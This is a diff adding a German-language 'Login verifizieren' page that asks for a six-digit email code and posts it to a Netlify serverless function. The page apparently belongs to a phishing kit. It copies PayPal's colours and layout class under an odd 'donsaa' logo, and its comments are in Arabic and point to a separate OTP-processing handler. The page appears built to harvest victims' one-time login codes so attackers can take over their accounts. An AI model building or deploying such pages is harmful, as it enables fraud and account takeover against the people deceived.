@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Login verifizieren</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <style>
+        /* الأنماط المدمجة ضرورية لأن ملف CSS الرئيسي لا يحتوي على كل أكواد OTP */
+        .otp-container { display: flex; justify-content: space-between; margin: 40px 0; width: 100%; max-width: 320px; margin-left: auto; margin-right: auto; }
+        .otp-input { width: 40px; height: 55px; text-align: center; font-size: 24px; border: 1px solid #9da3a6; border-radius: 4px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+        .otp-input:focus { border-color: #0070ba; box-shadow: 0 0 0 1px #0070ba inset; }
+        .btn-verify { background-color: #0070ba; color: #fff; }
+        .btn-verify:hover { background-color: #003460; }
+        .resend-link { display: block; margin-top: 20px; color: #0070ba; font-weight: 600; font-size: 14px; text-decoration: none; }
+        .header-text { font-size: 18px; font-weight: 500; color: #000000; margin-bottom: 30px; line-height: 1.5; }
+        body { justify-content: center; align-items: center; } 
+    </style>
+</head>
+<body>
+
+    <div class="corral">
+        <div class="login-card">
+            
+            <div class="logo-container">
+                <span class="logo-text">donsaa</span>
+            </div>
+
+            <p class="header-text">
+                Bitte geben Sie den 6-stelligen Code ein, der an Ihre E-Mail gesendet wurde.
+            </p>
+
+            <form id="otpForm" action="/.netlify/functions/process_otp" method="post">
+                
+                <div class="otp-container">
+                    <input type="tel" class="otp-input" maxlength="1" name="otp1" id="otp1">
+                    <input type="tel" class="otp-input" maxlength="1" name="otp2" id="otp2">
+                    <input type="tel" class="otp-input" maxlength="1" name="otp3" id="otp3">
+                    <input type="tel" class="otp-input" maxlength="1" name="otp4" id="otp4">
+                    <input type="tel" class="otp-input" maxlength="1" name="otp5" id="otp5">
+                    <input type="tel" class="otp-input" maxlength="1" name="otp6" id="otp6">
+                </div>
+
+                <div class="actions">
+                    <button type="submit" class="btn btn-verify">Bestätigen</button>
+                </div>
+            </form>
+
+            <a href="#" class="resend-link">Code erneut senden</a>
+
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            const otpForm = document.getElementById('otpForm');
+
+            // منطق الانتقال التلقائي بين الحقول (مهم لـ OTP)
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    if (input.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+            });
+
+            // التحويل لملف المعالج عند التحقق
+            otpForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+
+                if (allFilled) {
+                    // تحويل لملف المعالج process_otp.php
+                    otpForm.submit(); 
+                } else {
+                    alert('Bitte geben Sie den vollständigen 6-stelligen Code ein.');
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
